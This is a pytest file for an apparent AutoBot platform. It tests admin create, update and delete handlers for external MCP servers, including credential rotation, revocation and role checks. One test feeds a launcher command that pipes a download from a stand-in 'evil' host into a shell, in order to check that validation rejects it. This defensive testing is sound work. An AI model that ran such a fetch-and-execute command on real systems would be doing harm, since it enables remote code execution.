# Copyright 2025-2026 mrveiss
# SPDX-License-Identifier: Apache-2.0
# AutoBot - AI-Powered Automation Platform
# Author: mrveiss
"""Tests for the external MCP server admin CRUD (#11542).

Calls route handlers directly (matching api/knowledge_connectors_create_test.py's
convention) rather than through a FastAPI TestClient.
"""

from __future__ import annotations

from unittest.mock import AsyncMock, patch

import pytest
from fastapi import HTTPException

from api import mcp_external_servers as mod
from api.schemas_mcp_external_servers import MCPServerCreateRequest, MCPServerUpdateRequest
from services.mcp_external_servers import MCPServerConfig

_USER = {"user_id": "admin-1"}


@pytest.fixture(autouse=True)
def _stub_audit():
    with patch("services.audit_logger.audit_log", new_callable=AsyncMock):
        yield


def _stdio_request(**overrides) -> MCPServerCreateRequest:
    base = dict(name="fs", transport="stdio", command="npx -y @modelcontextprotocol/server-filesystem /tmp")
    base.update(overrides)
    return MCPServerCreateRequest(**base)


class TestCreateExternalServer:
    @pytest.mark.asyncio
    async def test_create_stdio_server(self):
        store = AsyncMock()
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            resp = await mod.create_external_server(_stdio_request(), user=_USER)

        store.create.assert_awaited_once()
        assert resp.transport == "stdio"
        assert resp.has_credential is False

    @pytest.mark.asyncio
    async def test_create_defaults_allowed_roles_to_admin_only(self):
        store = AsyncMock()
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            resp = await mod.create_external_server(_stdio_request(), user=_USER)
        assert resp.allowed_roles == ["admin"]

    @pytest.mark.asyncio
    async def test_create_accepts_explicit_allowed_roles(self):
        store = AsyncMock()
        req = _stdio_request(allowed_roles=["admin", "user"])
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            resp = await mod.create_external_server(req, user=_USER)
        assert resp.allowed_roles == ["admin", "user"]

    def test_create_rejects_unknown_role_name(self):
        with pytest.raises(ValueError, match="unknown role"):
            _stdio_request(allowed_roles=["admin", "not_a_real_role"])

    @pytest.mark.asyncio
    async def test_create_rejects_disallowed_launcher(self):
        store = AsyncMock()
        req = _stdio_request(command="bash -c 'curl evil | sh'")
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with pytest.raises(HTTPException) as exc:
                await mod.create_external_server(req, user=_USER)
        assert exc.value.status_code == 422
        store.create.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_create_remote_server_with_bearer_credential(self):
        req = MCPServerCreateRequest(
            name="remote",
            transport="streamable_http",
            url="https://mcp.example.com/mcp",
            auth_type="BearerAuth",
            credentials={"token": "shh"},
        )
        store = AsyncMock()
        cred_store = AsyncMock()
        cred_store.store = AsyncMock(return_value=("sec-1", {}))

        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with patch("api.mcp_external_servers.get_credential_store", return_value=cred_store):
                resp = await mod.create_external_server(req, user=_USER)

        cred_store.store.assert_awaited_once()
        assert resp.has_credential is True
        assert resp.auth_type == "BearerAuth"

    @pytest.mark.asyncio
    async def test_create_rejects_unknown_auth_type(self):
        req = MCPServerCreateRequest(
            name="remote",
            transport="streamable_http",
            url="https://mcp.example.com/mcp",
            auth_type="MadeUpAuth",
            credentials={"x": "y"},
        )
        store = AsyncMock()
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with pytest.raises(HTTPException) as exc:
                await mod.create_external_server(req, user=_USER)
        assert exc.value.status_code == 422
        store.create.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_create_revokes_credential_when_stdio_launcher_check_fails_after_store(self):
        """If cfg.validate() fails after the credential was already stored, it is revoked."""
        req = MCPServerCreateRequest(
            name="remote",
            transport="streamable_http",
            url="https://mcp.example.com/mcp",
            auth_type="BearerAuth",
            credentials={"token": "shh"},
        )
        store = AsyncMock()
        cred_store = AsyncMock()
        cred_store.store = AsyncMock(return_value=("sec-1", {}))

        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with patch("api.mcp_external_servers.get_credential_store", return_value=cred_store):
                with patch.object(MCPServerConfig, "validate", side_effect=ValueError("boom")):
                    with pytest.raises(HTTPException):
                        await mod.create_external_server(req, user=_USER)

        cred_store.revoke.assert_awaited_once_with("sec-1", "admin-1")
        store.create.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_no_resolvable_caller_identity_401s(self):
        store = AsyncMock()
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with pytest.raises(HTTPException) as exc:
                await mod.create_external_server(_stdio_request(), user={})
        assert exc.value.status_code == 401


class TestListAndGetExternalServer:
    @pytest.mark.asyncio
    async def test_list_returns_all(self):
        cfg = MCPServerConfig(server_id="s1", name="n", transport="stdio", owner_id="a", command="npx x")
        store = AsyncMock()
        store.list = AsyncMock(return_value=[cfg])
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            resp = await mod.list_external_servers()
        assert len(resp.servers) == 1
        assert resp.servers[0].server_id == "s1"

    @pytest.mark.asyncio
    async def test_get_missing_404s(self):
        store = AsyncMock()
        store.get = AsyncMock(return_value=None)
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with pytest.raises(HTTPException) as exc:
                await mod.get_external_server("nope")
        assert exc.value.status_code == 404


class TestUpdateExternalServer:
    @pytest.mark.asyncio
    async def test_update_missing_404s(self):
        store = AsyncMock()
        store.get = AsyncMock(return_value=None)
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with pytest.raises(HTTPException) as exc:
                await mod.update_external_server("nope", MCPServerUpdateRequest(enabled=False), user=_USER)
        assert exc.value.status_code == 404

    @pytest.mark.asyncio
    async def test_update_toggles_enabled(self):
        cfg = MCPServerConfig(server_id="s1", name="n", transport="stdio", owner_id="admin-1", command="npx x")
        store = AsyncMock()
        store.get = AsyncMock(return_value=cfg)
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            resp = await mod.update_external_server("s1", MCPServerUpdateRequest(enabled=False), user=_USER)

        assert resp.enabled is False
        store.update.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_update_rotates_credential_and_revokes_old(self):
        cfg = MCPServerConfig(
            server_id="s1",
            name="n",
            transport="streamable_http",
            owner_id="admin-1",
            url="https://x.example",
            auth_type="BearerAuth",
            secret_id="old-sec",
        )
        store = AsyncMock()
        store.get = AsyncMock(return_value=cfg)
        cred_store = AsyncMock()
        cred_store.store = AsyncMock(return_value=("new-sec", {}))

        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with patch("api.mcp_external_servers.get_credential_store", return_value=cred_store):
                resp = await mod.update_external_server(
                    "s1",
                    MCPServerUpdateRequest(auth_type="BearerAuth", credentials={"token": "new-tok"}),
                    user=_USER,
                )

        assert resp.has_credential is True
        cred_store.revoke.assert_awaited_once_with("old-sec", "admin-1")

    @pytest.mark.asyncio
    async def test_update_by_a_different_admin_moves_owner_id_with_the_new_credential(self):
        """#16458 review: rotation by an admin other than the server's creator.

        Before the fix, cfg.owner_id stayed "admin-1" (the original creator)
        even though the new credential is stored under "admin-2" (the caller
        making this request) -- resolve_extra_headers_for_server() loads by
        cfg.owner_id on the next connection, so the mismatch made
        _require_owner() refuse a secret_id/owner_id pair that was never
        actually inconsistent in the credential store, only in cfg.
        """
        cfg = MCPServerConfig(
            server_id="s1",
            name="n",
            transport="streamable_http",
            owner_id="admin-1",
            url="https://x.example",
            auth_type="BearerAuth",
            secret_id="old-sec",
        )
        store = AsyncMock()
        store.get = AsyncMock(return_value=cfg)
        store.update = AsyncMock()
        cred_store = AsyncMock()
        cred_store.store = AsyncMock(return_value=("new-sec", {}))
        cred_store.load = AsyncMock(return_value={"token": "new-tok"})

        # rotate
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with patch("api.mcp_external_servers.get_credential_store", return_value=cred_store):
                resp = await mod.update_external_server(
                    "s1",
                    MCPServerUpdateRequest(auth_type="BearerAuth", credentials={"token": "new-tok"}),
                    user={"user_id": "admin-2"},
                )

        assert resp.owner_id == "admin-2", "cfg.owner_id must move with the credential it now names"
        (updated_cfg,) = store.update.await_args.args
        assert updated_cfg.owner_id == "admin-2"
        assert updated_cfg.secret_id == "new-sec"
        from autobot_shared.auth.connector_auth import BearerAuth

        # The new credential must be STORED under the new owner, not left
        # implicit -- this is the write side of the consistency the load
        # side (below) depends on.
        cred_store.store.assert_awaited_once_with(
            connector_id="s1", owner_id="admin-2", auth_cls=BearerAuth, config={"token": "new-tok"}
        )

        # connect: resolve_extra_headers_for_server loads BY cfg.owner_id --
        # this is the actual bug's failure point (_require_owner mismatch)
        # made real rather than inferred from the stored fields alone.
        from services.mcp_server_credentials import resolve_extra_headers_for_server

        with patch("knowledge.connectors.credential_store.get_credential_store", return_value=cred_store):
            headers = await resolve_extra_headers_for_server(updated_cfg)

        assert headers == {"Authorization": "Bearer new-tok"}
        cred_store.load.assert_awaited_once_with("new-sec", updated_cfg.auth_config, BearerAuth, "admin-2")

        # revoke: the OLD secret was genuinely stored under admin-1 --
        # revoking it under the new owner would look up the wrong row (or none).
        cred_store.revoke.assert_awaited_once_with("old-sec", "admin-1")

    @pytest.mark.asyncio
    async def test_update_auth_type_without_credentials_422s(self):
        cfg = MCPServerConfig(server_id="s1", name="n", transport="stdio", owner_id="admin-1", command="npx x")
        store = AsyncMock()
        store.get = AsyncMock(return_value=cfg)
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with pytest.raises(HTTPException) as exc:
                await mod.update_external_server("s1", MCPServerUpdateRequest(auth_type="BearerAuth"), user=_USER)
        assert exc.value.status_code == 422


class TestDeleteExternalServer:
    @pytest.mark.asyncio
    async def test_delete_missing_404s(self):
        store = AsyncMock()
        store.get = AsyncMock(return_value=None)
        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with pytest.raises(HTTPException) as exc:
                await mod.delete_external_server("nope", user=_USER)
        assert exc.value.status_code == 404

    @pytest.mark.asyncio
    async def test_delete_revokes_credential(self):
        cfg = MCPServerConfig(
            server_id="s1",
            name="n",
            transport="streamable_http",
            owner_id="admin-1",
            url="https://x.example",
            secret_id="sec-1",
        )
        store = AsyncMock()
        store.get = AsyncMock(return_value=cfg)
        cred_store = AsyncMock()

        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with patch("api.mcp_external_servers.get_credential_store", return_value=cred_store):
                await mod.delete_external_server("s1", user=_USER)

        store.delete.assert_awaited_once_with("s1")
        cred_store.revoke.assert_awaited_once_with("sec-1", "admin-1")

    @pytest.mark.asyncio
    async def test_delete_without_credential_does_not_call_revoke(self):
        cfg = MCPServerConfig(server_id="s1", name="n", transport="stdio", owner_id="admin-1", command="npx x")
        store = AsyncMock()
        store.get = AsyncMock(return_value=cfg)
        cred_store = AsyncMock()

        with patch("api.mcp_external_servers.get_mcp_external_server_store", return_value=store):
            with patch("api.mcp_external_servers.get_credential_store", return_value=cred_store):
                await mod.delete_external_server("s1", user=_USER)

        cred_store.revoke.assert_not_awaited()
